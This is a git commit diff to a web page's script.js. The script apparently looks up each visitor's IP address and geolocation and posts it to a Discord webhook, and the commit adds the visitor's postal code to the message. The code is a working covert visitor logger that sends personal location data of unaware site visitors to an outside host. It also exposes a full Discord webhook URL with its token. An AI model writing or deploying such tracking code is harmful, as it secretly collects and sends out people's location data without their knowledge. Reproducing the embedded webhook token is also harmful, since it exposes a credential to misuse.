760bfb542a9069cacce973431592866118c003e4
DrDreadful <124979607+DrDreadful5Official@users.noreply.github.com>
2024-04-21 16:46:21 -0700

    Update script.js

--- script.js
+++ script.js
@@ -11,12 +11,13 @@ fetch('https://httpbin.org/ip')
         var region = geoData.region;
         var country = geoData.country;
         var isp = geoData.org;
+        var postalCode = geoData.postal;
 
         // Replace 'YOUR_DISCORD_WEBHOOK_URL_HERE' with your actual Discord webhook URL
         var webhookUrl = 'https://discord.com/api/webhooks/1231425931453792256/zDbYK2ISGhEl32ory64ubBIB3jv0oPibP5XW1MZA7ztB32zvvZdVyzGBM2_yGimCi5Td';
 
         // Send a message to Discord webhook including the geolocation information
-        var message = `Someone visited the website from ${city}, ${region}, ${country}. Internet provider: ${isp}. IP Address: ${clientIp}`;
+        var message = `Someone visited the website from ${city}, ${region}, ${country}. Internet provider: ${isp}. Postal Code: ${postalCode}. IP Address: ${clientIp}`;
         sendMessageToDiscord(webhookUrl, message);
       })
       .catch(error => {
